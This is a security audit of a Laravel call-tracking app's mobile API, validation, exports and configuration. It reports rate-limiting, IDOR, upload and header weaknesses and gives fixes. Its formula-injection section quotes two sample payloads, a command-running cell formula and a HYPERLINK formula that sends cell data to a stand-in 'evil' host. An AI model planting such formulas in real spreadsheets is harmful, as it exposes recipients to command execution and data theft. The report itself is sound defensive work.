# Laravel Security Audit — Call Stats

- **Date:** 2026-06-07
- **Scope:** Authentication/authorization, mobile API endpoints, form-request validation, mass assignment, file upload/import, spreadsheet export, middleware, and environment/config hardening.
- **Method:** Static review of `routes/`, `app/Http/Controllers`, `app/Http/Requests`, `app/Actions`, `app/Models`, `app/Services`, `app/Providers`, `bootstrap/app.php`, and `config/`. No code changed — read-only findings.

The app gets the fundamentals right: passwords are hashed (`password => hashed` cast), every query uses Eloquent/builder binding (no raw user-interpolated SQL), web login is throttled via Fortify, models use `$fillable` allow-lists, cookies are encrypted, and last-admin guards exist on user update/delete. The risk concentrates in the **mobile API** (`routes/api.php`) — a custom surface that bypasses the protections Fortify provides on the web side.

---

## 1. Mobile API authentication & authorization

### 1a. No rate limiting on `/api/login` (brute-force / hash-DoS)
`routes/api.php:11`
```php
Route::post('/login', [ApiAuthController::class, 'login']);   // no throttle middleware
```
The web login is throttled — `FortifyServiceProvider` defines a `login` limiter at 5/min keyed by email+IP — but the custom API login route has **no `throttle` middleware and uses no limiter**. `ApiAuthController::login()` runs an unbounded `Hash::check()` on every request, so:
- Agent credentials can be brute-forced / password-sprayed at full speed.
- The endpoint is an account-enumeration and timing oracle.
- `Hash::check()` is deliberately CPU-expensive, so unbounded calls double as a resource-exhaustion (DoS) vector.

**Fix:** apply `->middleware('throttle:login')` (or `throttle:5,1`) to the route, keyed by email + IP to mirror the Fortify limiter.

### 1b. Broken object-level authorization (IDOR) on API writes
`app/Http/Requests/Api/StoreCallLogRequest.php`, `StoreReminderRequest.php`, `app/Actions/CallLogs/StoreCallLogAction.php`, `StoreReminderAction.php`

The mobile write endpoints validate referenced IDs only with `exists:`, never that the referenced row belongs to the calling agent:
```php
'lead_id'     => 'required|exists:leads,id',          // any lead, not "my" lead
'call_log_id' => 'nullable|exists:call_logs,id',      // any agent's call log
```
`authorize()` returns `true` on both requests, and the action consumes `$data->leadId` / `$data->callLogId` directly. So an authenticated agent can `POST /api/call-logs` or `POST /api/reminders` against **leads assigned to other agents** (and attach a reminder to another agent's call log). The action correctly stamps `user_id` from the token, so this is not impersonation — but it is **cross-tenant data injection**: an agent can pollute other agents' pipelines and skew the performance/leaderboard reports that drive business decisions. There are no Policies in the app at all (`app/Policies` does not exist).

**Fix:** scope the existence rules to the caller, e.g.
`Rule::exists('leads', 'id')->where('assigned_to_id', $this->user()->id)` (and the equivalent for `call_log_id` via `user_id`); or enforce ownership in `authorize()` / the action. Add a `Lead` policy for model-level authorization.

### 1c. Unscoped `user_id` read branch (defense-in-depth)
`app/Http/Controllers/CallLogController.php` (`index`)
```php
if ($user->hasRole(UserRole::AGENT->value)) {
    $query->where('user_id', $user->id);
} elseif ($userId = $request->query('user_id')) {
    $query->where('user_id', $userId);          // any user's call logs
}
```
The `elseif` lets a non-agent token read **any** user's call logs by passing `?user_id=`. It is currently unreachable because tokens are only issued to agents (`ApiAuthController` rejects non-agents), so this is latent rather than live — but it will become exploitable the moment token issuance broadens.

**Fix:** remove the `user_id` query-param branch from the API, or gate it behind an explicit role/permission check.

---

## 2. Validation & input shaping

### 2a. API form requests `authorize()` return `true`
`LoginRequest`, `StoreCallLogRequest`, `StoreReminderRequest` all `return true` from `authorize()`. For the web/backoffice requests this is acceptable because their routes are role-gated (`role:admin|supervisor`, `role:admin`). For the API requests it is the enabling mechanism behind finding **1b** — there is no second authorization layer once the token authenticates. Treat `authorize()` as the place to enforce ownership on the API.

### 2b. Lead import accepts unbounded file size
`app/Http/Controllers/Backoffice/LeadImportController.php:18`
```php
'file' => ['required', 'file', 'mimes:xlsx,xls'],   // no max:
```
No `max:` size cap. `ImportLeadsAction::execute()` loads the entire spreadsheet into memory with `IOFactory::load()` then `toArray()`, so a large or crafted (zip-bomb) `.xlsx` can exhaust memory/CPU — a DoS. Admin-only, which limits exposure, but unbounded uploads should still be capped. Uploaded files are processed in place via `getRealPath()` and never persisted, so storage exposure is not a concern here.

**Fix:** add `'max:5120'` (or the real ceiling); consider chunked/streamed reading for large imports.

---

## 3. Output handling

### 3a. CSV / formula injection in spreadsheet exports
`app/Actions/CallLogs/ExportCallLogsAction.php`, `app/Actions/Reports/ExportAgentPerformanceAction.php`

User-supplied free text — `notes` (written by agents via the API), and `name` (from lead import) — is written straight into XLSX cells via `fromArray()`. A value beginning with `=`, `+`, `-`, `@`, tab, or CR is interpreted as a formula when a supervisor opens the export in Excel/Sheets, e.g. `=cmd|'/c calc'!A1` or `=HYPERLINK("http://evil/?"&A1)` for silent exfiltration. This is CWE-1236 (formula injection).

**Fix:** prefix any cell value starting with `= + - @ \t \r` with a `'`, or write the cells as explicit strings (`setCellValueExplicit(..., DataType::TYPE_STRING)`).

---

## 4. Transport & headers

### 4a. No security-headers middleware
There is no `SecurityHeaders` middleware in `app/Http/Middleware` and none is registered in `bootstrap/app.php`. No `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`, `X-Content-Type-Options`, or `Referrer-Policy` is sent. Add a middleware appended to the `web` group.

### 4b. No CORS configuration
`config/cors.php` is absent, so the framework default (`allowed_origins => ['*']`) applies to `api/*`. The API uses bearer-token auth (not stateful cookies), so credentialed-CORS abuse is limited, but origins should still be restricted explicitly rather than left as a wildcard.

---

## 5. Environment & deployment hardening

`.env` shows `APP_ENV=local`, so the following are acceptable in development but **must** be set before production:

| Setting | Current | Production target |
|---|---|---|
| `APP_DEBUG` | `true` | `false` (prevents stack-trace/secret leakage) |
| `SESSION_SECURE_COOKIE` | unset | `true` |
| `SESSION_SAME_SITE` | unset (default `lax`) | `lax` or `strict` for this backoffice |
| Trusted proxies | unset | configure for correct HTTPS detection behind a load balancer |

`SESSION_ENCRYPT=false` is fine given the `database` session driver. Also ensure the committed `APP_KEY` is **not** reused in production and that `.env` is never committed to source control.

---

## Summary

| ID | Issue | Severity | Recommendation |
|----|-------|----------|----------------|
| 1 | `/api/login` has no rate limiting (web login does) — brute-force / password-spray / hash-DoS | **High** | Add `throttle:login` middleware keyed by email + IP |
| 2 | IDOR on API writes: agents can create call logs/reminders against leads & call logs they don't own (`exists:` only, `authorize()` = `true`) | **High** | Scope `exists` rules to the caller (`assigned_to_id`/`user_id`); add a `Lead` policy |
| 3 | CSV/formula injection: unsanitized `notes`/`name` written into XLSX exports | **Medium** | Escape leading `= + - @`/tab/CR or write cells as explicit strings |
| 4 | Lead import has no file-size limit; whole spreadsheet loaded into memory | **Medium** | Add `max:` to the rule; stream/chunk large files |
| 5 | API form requests `authorize()` return `true` — no authorization layer behind token auth | **Medium** | Enforce ownership in `authorize()`/actions (mechanism behind #2) |
| 6 | Unscoped `?user_id=` read branch in API `CallLogController::index` (latent — non-agent tokens) | **Low** | Remove the query-param branch or gate behind a role check |
| 7 | No security-headers middleware (CSP/HSTS/X-Frame-Options/X-Content-Type-Options/Referrer-Policy) | **Low** | Add a `SecurityHeaders` middleware to the `web` group |
| 8 | No `config/cors.php`; default allows all origins on `api/*` | **Low** | Add explicit `allowed_origins`; avoid `*` |
| 9 | Production env hardening not set (`APP_DEBUG`, secure/same-site cookies, trusted proxies) | **Low/Info** | Set production values; keep `APP_KEY`/`.env` out of source control |

**Where to start:** #1 and #2 are the only remotely reachable, authenticated-abuse findings and should land before production — both are small, localized changes. #3–#5 are hardening of existing surfaces. #6–#9 are defense-in-depth and deployment configuration.
